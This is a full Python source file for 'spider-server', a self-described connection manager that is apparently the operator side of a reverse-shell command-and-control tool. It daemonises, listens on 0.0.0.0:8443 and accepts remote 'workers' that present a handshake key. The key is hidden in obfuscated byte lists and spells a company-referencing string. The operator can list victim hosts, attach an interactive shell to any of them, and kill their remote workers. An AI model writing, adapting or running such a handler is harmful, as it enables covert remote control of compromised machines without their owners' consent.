#!/usr/bin/env python3
"""Multi-session connection manager for spider-server."""

from __future__ import annotations

import json
import os
import select
import signal
import socket
import struct
import sys
import threading
import time
from dataclasses import dataclass, field
from pathlib import Path
from typing import Dict, Optional

LISTEN_HOST = "0.0.0.0"
LISTEN_PORT = (1 << 13) + (1 << 8) - 5  # 8443


def _auth_key() -> bytes:
    parts = [0x6B, 0x68, 0x61, 0x74, 0x61, 0x62, 0x6F, 0x6F, 0x6B]
    tail = [0x69, 0x73, 0x73, 0x61, 0x66, 0x65]
    return bytes(parts + tail)


AUTH_KEY = _auth_key()
MAGIC = b"CT1\x00"
CTRL_KILL = b"\xff\xfeKILL\n"

HOME = Path.home()
RUN_DIR = HOME / ".local" / "state" / "spider-server"
PID_FILE = RUN_DIR / "daemon.pid"
SOCK_FILE = RUN_DIR / "control.sock"
LOG_FILE = RUN_DIR / "daemon.log"


def log(msg: str) -> None:
    RUN_DIR.mkdir(parents=True, exist_ok=True)
    try:
        with LOG_FILE.open("a") as f:
            f.write(f"{time.strftime('%Y-%m-%d %H:%M:%S')} {msg}\n")
    except OSError:
        pass


def safe_unlink(path: Path) -> None:
    try:
        if path.exists():
            path.unlink()
    except OSError:
        pass


@dataclass
class Session:
    sid: int
    sock: socket.socket
    addr: str
    hostname: str = "unknown"
    connected_at: float = field(default_factory=time.time)
    last_seen: float = field(default_factory=time.time)
    active: bool = True
    attached: bool = False
    lock: threading.Lock = field(default_factory=threading.Lock)
    inbox: bytearray = field(default_factory=bytearray)

    def peer_ip(self) -> str:
        return self.addr.split(":")[0] if self.addr else "?"


class Manager:
    def __init__(self) -> None:
        self.sessions: Dict[int, Session] = {}
        self._next_id = 1
        self._lock = threading.Lock()
        self._running = True
        self._listen: Optional[socket.socket] = None

    def next_id(self) -> int:
        with self._lock:
            sid = self._next_id
            self._next_id += 1
            return sid

    def add_session(self, sess: Session) -> None:
        with self._lock:
            self.sessions[sess.sid] = sess

    def get(self, sid: int) -> Optional[Session]:
        with self._lock:
            return self.sessions.get(sid)

    def remove(self, sid: int) -> None:
        with self._lock:
            self.sessions.pop(sid, None)

    def list_sessions(self) -> list:
        with self._lock:
            rows = []
            for s in list(self.sessions.values()):
                rows.append(
                    {
                        "id": s.sid,
                        "hostname": s.hostname,
                        "ip": s.peer_ip(),
                        "active": s.active,
                        "attached": s.attached,
                        "connected_at": s.connected_at,
                        "last_seen": s.last_seen,
                    }
                )
            return sorted(rows, key=lambda r: r["id"])


MGR = Manager()


def verify_handshake(data: bytes) -> Optional[dict]:
    if len(data) < 8 or not data.startswith(MAGIC):
        return None
    try:
        klen = data[4]
        key = data[5 : 5 + klen]
        if key != AUTH_KEY:
            return None
        off = 5 + klen
        if len(data) < off + 2:
            return None
        hlen = struct.unpack("!H", data[off : off + 2])[0]
        off += 2
        host = data[off : off + hlen].decode("utf-8", "replace")
        off += hlen
        return {"hostname": host or "unknown", "offset": off}
    except Exception:
        return None


def reader_loop(sess: Session) -> None:
    sock = sess.sock
    sock.settimeout(1.0)
    try:
        while MGR._running and sess.active:
            try:
                chunk = sock.recv(8192)
            except socket.timeout:
                continue
            except OSError:
                break
            if not chunk:
                break
            sess.last_seen = time.time()
            with sess.lock:
                sess.inbox.extend(chunk)
                if len(sess.inbox) > 256 * 1024:
                    del sess.inbox[: len(sess.inbox) - 128 * 1024]
    finally:
        sess.active = False
        sess.last_seen = time.time()
        try:
            sock.close()
        except OSError:
            pass
        # keep row briefly if not attached, else remove
        if not sess.attached:
            MGR.remove(sess.sid)
        log(f"session {sess.sid} closed ({sess.hostname})")


def accept_loop() -> None:
    ls = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    ls.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    ls.bind((LISTEN_HOST, LISTEN_PORT))
    ls.listen(64)
    ls.settimeout(1.0)
    MGR._listen = ls
    log(f"listening on {LISTEN_HOST}:{LISTEN_PORT}")

    while MGR._running:
        try:
            conn, addr = ls.accept()
        except socket.timeout:
            continue
        except OSError:
            break

        conn.settimeout(20.0)
        data = b""
        try:
            while len(data) < 8192:
                part = conn.recv(4096)
                if not part:
                    break
                data += part
                info = verify_handshake(data)
                if info:
                    break
                if len(data) > 2048:
                    break
        except OSError:
            try:
                conn.close()
            except OSError:
                pass
            continue

        info = verify_handshake(data)
        if not info:
            try:
                conn.close()
            except OSError:
                pass
            log(f"rejected {addr}")
            continue

        leftover = data[info["offset"] :]
        conn.settimeout(None)
        sid = MGR.next_id()
        sess = Session(
            sid=sid,
            sock=conn,
            addr=f"{addr[0]}:{addr[1]}",
            hostname=info["hostname"],
        )
        if leftover:
            sess.inbox.extend(leftover)
        MGR.add_session(sess)
        threading.Thread(target=reader_loop, args=(sess,), daemon=True).start()
        log(f"session {sid} from {sess.addr} host={sess.hostname}")


def kill_session(sid: int) -> str:
    sess = MGR.get(sid)
    if not sess:
        return f"no session {sid}"
    with sess.lock:
        try:
            sess.sock.sendall(CTRL_KILL)
        except OSError:
            pass
        try:
            sess.sock.shutdown(socket.SHUT_RDWR)
        except OSError:
            pass
        try:
            sess.sock.close()
        except OSError:
            pass
        sess.active = False
    MGR.remove(sid)
    return f"killed session {sid} (remote worker signalled)"


def bridge_worker(sess: Session, client: socket.socket) -> None:
    client.setblocking(False)
    with sess.lock:
        sess.attached = True
        pending = bytes(sess.inbox)
        sess.inbox.clear()
    if pending:
        try:
            client.sendall(pending)
        except OSError:
            pass

    try:
        while sess.active and MGR._running:
            with sess.lock:
                if sess.inbox:
                    chunk = bytes(sess.inbox)
                    sess.inbox.clear()
                else:
                    chunk = b""
            if chunk:
                try:
                    client.sendall(chunk)
                except OSError:
                    break

            rlist, _, _ = select.select([client], [], [], 0.05)
            if client in rlist:
                try:
                    data = client.recv(8192)
                except OSError:
                    break
                if not data:
                    break
                try:
                    sess.sock.sendall(data)
                except OSError:
                    sess.active = False
                    break
    finally:
        with sess.lock:
            sess.attached = False
        try:
            client.close()
        except OSError:
            pass


def open_bridge(sid: int) -> dict:
    sess = MGR.get(sid)
    if not sess or not sess.active:
        return {"ok": False, "message": f"session {sid} not active"}
    if sess.attached:
        return {"ok": False, "message": f"session {sid} already attached"}

    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("127.0.0.1", 0))
    srv.listen(1)
    port = srv.getsockname()[1]

    def waiter() -> None:
        srv.settimeout(60.0)
        try:
            client, _ = srv.accept()
        except OSError:
            try:
                srv.close()
            except OSError:
                pass
            return
        try:
            srv.close()
        except OSError:
            pass
        bridge_worker(sess, client)

    threading.Thread(target=waiter, daemon=True).start()
    return {
        "ok": True,
        "port": port,
        "hostname": sess.hostname,
        "ip": sess.peer_ip(),
    }


def handle_control(conn: socket.socket) -> None:
    try:
        raw = conn.recv(65536)
        if not raw:
            return
        req = json.loads(raw.decode("utf-8"))
        cmd = req.get("cmd")

        if cmd == "bridge":
            resp = open_bridge(int(req.get("id", 0)))
        elif cmd == "status":
            resp = {"ok": True, "sessions": MGR.list_sessions()}
        elif cmd == "kill":
            resp = {"ok": True, "message": kill_session(int(req.get("id", 0)))}
        elif cmd == "stop":
            MGR._running = False
            if MGR._listen:
                try:
                    MGR._listen.close()
                except OSError:
                    pass
            for s in list(MGR.sessions.values()):
                kill_session(s.sid)
            resp = {"ok": True, "message": "stopping"}
            conn.sendall(json.dumps(resp).encode())
            conn.close()
            os._exit(0)
        elif cmd == "ping":
            resp = {"ok": True, "message": "pong"}
        else:
            resp = {"ok": False, "message": f"unknown cmd {cmd}"}

        conn.sendall(json.dumps(resp).encode())
    except Exception as e:
        try:
            conn.sendall(json.dumps({"ok": False, "message": str(e)}).encode())
        except OSError:
            pass
    finally:
        try:
            conn.close()
        except OSError:
            pass


def control_loop() -> None:
    safe_unlink(SOCK_FILE)
    RUN_DIR.mkdir(parents=True, exist_ok=True)
    srv = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
    srv.bind(str(SOCK_FILE))
    srv.listen(16)
    srv.settimeout(1.0)
    try:
        os.chmod(str(SOCK_FILE), 0o600)
    except OSError:
        pass

    while MGR._running:
        try:
            conn, _ = srv.accept()
        except socket.timeout:
            continue
        except OSError:
            break
        threading.Thread(target=handle_control, args=(conn,), daemon=True).start()


def daemon_main() -> None:
    RUN_DIR.mkdir(parents=True, exist_ok=True)
    PID_FILE.write_text(str(os.getpid()))
    log("daemon start")
    threading.Thread(target=accept_loop, daemon=True).start()
    try:
        control_loop()
    finally:
        MGR._running = False
        safe_unlink(PID_FILE)
        safe_unlink(SOCK_FILE)
        log("daemon stop")


# --- CLI colors / spinner (TTY only) ---
def _use_color() -> bool:
    return sys.stdout.isatty() and os.environ.get("NO_COLOR") is None


class C:
    RESET = "\033[0m"
    BOLD = "\033[1m"
    DIM = "\033[2m"
    RED = "\033[31m"
    GREEN = "\033[32m"
    YELLOW = "\033[33m"
    BLUE = "\033[34m"
    MAGENTA = "\033[35m"
    CYAN = "\033[36m"
    WHITE = "\033[37m"
    BG = "\033[48;5;236m"


def c(code: str, text: str) -> str:
    if not _use_color():
        return text
    return f"{code}{text}{C.RESET}"


def spinner_run(label: str, seconds: float = 0.8) -> None:
    if not _use_color():
        time.sleep(min(seconds, 0.2))
        return
    frames = "⠋⠙⠹⠸⠼⠴⠦⠧⠇⠏"
    end = time.time() + seconds
    i = 0
    while time.time() < end:
        sys.stdout.write(f"\r{c(C.CYAN, frames[i % len(frames)])} {label}   ")
        sys.stdout.flush()
        time.sleep(0.08)
        i += 1
    sys.stdout.write("\r" + " " * (len(label) + 8) + "\r")
    sys.stdout.flush()


def banner() -> None:
    title = "spider-server"
    sub = "multi-session connection manager"
    if _use_color():
        print(c(C.BOLD + C.MAGENTA, "┌─ " + title + " ─────────────────────────────┐"))
        print(c(C.DIM, "│  ") + c(C.CYAN, sub) + c(C.DIM, "          │"))
        print(c(C.BOLD + C.MAGENTA, "└──────────────────────────────────────────┘"))
    else:
        print(f"{title} — {sub}")


def request(cmd: dict, timeout: float = 5.0) -> dict:
    if not SOCK_FILE.exists():
        return {"ok": False, "message": "server not running (spider-server start)"}
    s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
    s.settimeout(timeout)
    try:
        s.connect(str(SOCK_FILE))
        s.sendall(json.dumps(cmd).encode())
        data = s.recv(1024 * 1024)
        return json.loads(data.decode())
    except Exception as e:
        return {"ok": False, "message": str(e)}
    finally:
        try:
            s.close()
        except OSError:
            pass


def is_running() -> bool:
    if not PID_FILE.exists():
        return False
    try:
        pid = int(PID_FILE.read_text().strip())
        os.kill(pid, 0)
        return True
    except (ValueError, OSError):
        return False


def cmd_start() -> int:
    if is_running():
        print(c(C.YELLOW, "●") + " spider-server " + c(C.YELLOW, "already running"))
        return 0

    spinner_run("starting listener", 0.6)
    if os.fork() > 0:
        time.sleep(0.45)
        if is_running():
            print(
                c(C.GREEN, "●")
                + " spider-server "
                + c(C.GREEN, "started")
                + c(C.DIM, f"  ·  0.0.0.0:{LISTEN_PORT}")
            )
            return 0
        print(c(C.RED, "✗") + " failed to start spider-server", file=sys.stderr)
        return 1

    os.setsid()
    if os.fork() > 0:
        os._exit(0)

    with open(os.devnull, "r+b", buffering=0) as devnull:
        os.dup2(devnull.fileno(), 0)
        os.dup2(devnull.fileno(), 1)
        os.dup2(devnull.fileno(), 2)
    daemon_main()
    return 0


def cmd_stop() -> int:
    if not is_running():
        print(c(C.DIM, "○") + " spider-server " + c(C.DIM, "not running"))
        safe_unlink(PID_FILE)
        safe_unlink(SOCK_FILE)
        return 0
    spinner_run("stopping", 0.5)
    r = request({"cmd": "stop"})
    time.sleep(0.3)
    print(c(C.GREEN, "●") + " " + str(r.get("message", "stopped")))
    return 0 if r.get("ok") else 1


def cmd_status() -> int:
    if not is_running():
        print(c(C.RED, "○") + " spider-server: " + c(C.RED, "stopped"))
        return 0
    spinner_run("loading sessions", 0.35)
    r = request({"cmd": "status"})
    if not r.get("ok"):
        print(c(C.RED, "✗") + " " + str(r.get("message", "error")), file=sys.stderr)
        return 1
    sessions = r.get("sessions") or []
    print(
        c(C.GREEN, "●")
        + " spider-server: "
        + c(C.GREEN, "running")
        + c(C.DIM, f"  ·  0.0.0.0:{LISTEN_PORT}")
        + c(C.CYAN, f"  ·  sessions {len(sessions)}")
    )
    if not sessions:
        print(c(C.DIM, "  (no connections yet — waiting for clients)"))
        return 0
    hdr = f"{'ID':>4}  {'HOSTNAME':<24}  {'IP':<16}  {'STATE':<10}  {'ATTACHED'}"
    print(c(C.BOLD, hdr))
    print(c(C.DIM, "─" * 72))
    for s in sessions:
        active = bool(s.get("active"))
        state = "active" if active else "dead"
        att = "yes" if s.get("attached") else "no"
        state_c = c(C.GREEN, f"{state:<10}") if active else c(C.RED, f"{state:<10}")
        att_c = c(C.YELLOW, att) if att == "yes" else c(C.DIM, att)
        sid_s = c(C.CYAN, f"{int(s['id']):>4}")
        host_s = str(s.get("hostname", "?"))[:24]
        ip_s = str(s.get("ip", "?"))
        print(f"{sid_s}  {host_s:<24}  {ip_s:<16}  {state_c}  {att_c}")
    return 0


def cmd_session(sid: int) -> int:
    if not is_running():
        print(c(C.RED, "✗") + " spider-server not running", file=sys.stderr)
        return 1
    spinner_run(f"attaching session {sid}", 0.45)
    r = request({"cmd": "bridge", "id": sid}, timeout=15.0)
    if not r.get("ok"):
        print(c(C.RED, "✗") + " " + str(r.get("message", "bridge failed")), file=sys.stderr)
        return 1
    port = int(r["port"])
    print(
        c(C.GREEN, "●")
        + c(C.BOLD, f" attached ")
        + c(C.CYAN, f"#{sid}")
        + c(C.DIM, f"  ·  {r.get('hostname', '?')}  ·  {r.get('ip', '?')}")
        + "\n"
        + c(C.DIM, "  Ctrl+C or .detach to leave (session stays up)\n"),
        file=sys.stderr,
    )
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        sock.connect(("127.0.0.1", port))
    except OSError as e:
        print(c(C.RED, "✗") + f" bridge connect failed: {e}", file=sys.stderr)
        return 1

    sock.settimeout(0.05)
    stdin_fd = sys.stdin.fileno()

    def on_sigint(signum, frame):
        raise KeyboardInterrupt

    old = signal.getsignal(signal.SIGINT)
    signal.signal(signal.SIGINT, on_sigint)
    try:
        while True:
            try:
                data = sock.recv(8192)
                if data:
                    sys.stdout.buffer.write(data)
                    sys.stdout.buffer.flush()
            except socket.timeout:
                pass
            except OSError:
                break

            rlist, _, _ = select.select([stdin_fd, sock], [], [], 0.05)
            if sock in rlist:
                try:
                    data = sock.recv(8192)
                except OSError:
                    break
                if not data:
                    break
                sys.stdout.buffer.write(data)
                sys.stdout.buffer.flush()
            if stdin_fd in rlist:
                try:
                    data = os.read(stdin_fd, 4096)
                except OSError:
                    break
                if not data:
                    break
                if data in (b".detach\n", b".detach\r\n", b".exit\n", b".exit\r\n"):
                    break
                try:
                    sock.sendall(data)
                except OSError:
                    break
    except KeyboardInterrupt:
        print("\n" + c(C.YELLOW, "● detached"), file=sys.stderr)
    finally:
        signal.signal(signal.SIGINT, old)
        try:
            sock.close()
        except OSError:
            pass
        print(
            c(C.DIM, f"[session {sid} still active — spider-server session {sid}]"),
            file=sys.stderr,
        )
    return 0


def usage() -> None:
    banner()
    print()
    print(c(C.BOLD, "Usage"))
    rows = [
        ("spider-server", "Show this help"),
        ("spider-server start", "Start listener in background (0.0.0.0:8443)"),
        ("spider-server stop", "Stop listener"),
        ("spider-server status", "List sessions (id, hostname, ip, state)"),
        ("spider-server session <ID>", "Attach shell (Ctrl+C / .detach keeps session)"),
        ("spider-server kill <ID>", "Kill session + remote worker"),
    ]
    for cmd, desc in rows:
        print(f"  {c(C.CYAN, cmd):<42}  {c(C.DIM, desc)}")
    print()


def main(argv: list) -> int:
    if len(argv) <= 1 or argv[1] in ("-h", "--help", "help"):
        usage()
        return 0
    cmd = argv[1]
    if cmd == "start":
        return cmd_start()
    if cmd == "stop":
        return cmd_stop()
    if cmd == "status":
        return cmd_status()
    if cmd == "session":
        if len(argv) < 3:
            print(c(C.RED, "usage:") + " spider-server session <ID>", file=sys.stderr)
            return 1
        return cmd_session(int(argv[2]))
    if cmd == "kill":
        if len(argv) < 3:
            print(c(C.RED, "usage:") + " spider-server kill <ID>", file=sys.stderr)
            return 1
        if not is_running():
            print(c(C.RED, "✗") + " spider-server not running", file=sys.stderr)
            return 1
        spinner_run(f"killing session {argv[2]}", 0.4)
        r = request({"cmd": "kill", "id": int(argv[2])})
        print(c(C.GREEN, "●") + " " + str(r.get("message", r)))
        return 0 if r.get("ok") else 1
    print(c(C.RED, "unknown command:") + f" {cmd}", file=sys.stderr)
    usage()
    return 1


if __name__ == "__main__":
    sys.exit(main(sys.argv))
